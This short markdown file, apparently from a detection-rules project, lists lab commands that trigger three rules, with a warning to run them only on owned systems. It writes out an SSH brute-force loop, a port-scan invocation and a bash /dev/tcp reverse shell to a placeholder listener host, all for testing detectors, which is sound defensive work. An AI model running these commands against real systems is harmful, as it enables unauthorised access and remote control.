# Test commands

Each command here generates the event that the corresponding rule detects.
**Run only against systems you own.** These are lab commands, not a toolkit.

| Rule | Command | Doc |
|------|---------|-----|
| ssh_bruteforce | `for i in $(seq 1 15); do ssh wronguser@LAB_IP; done` | [docs/ssh_bruteforce.md](../docs/ssh_bruteforce.md) |
| port_scan_burst | `python3 netrecon.py LAB_IP -p 1-200` | [docs/port_scan_burst.md](../docs/port_scan_burst.md) |
| reverse_shell_devtcp | `bash -c 'bash -i >& /dev/tcp/LISTENER_IP/4444 0>&1'` | [docs/reverse_shell_devtcp.md](../docs/reverse_shell_devtcp.md) |
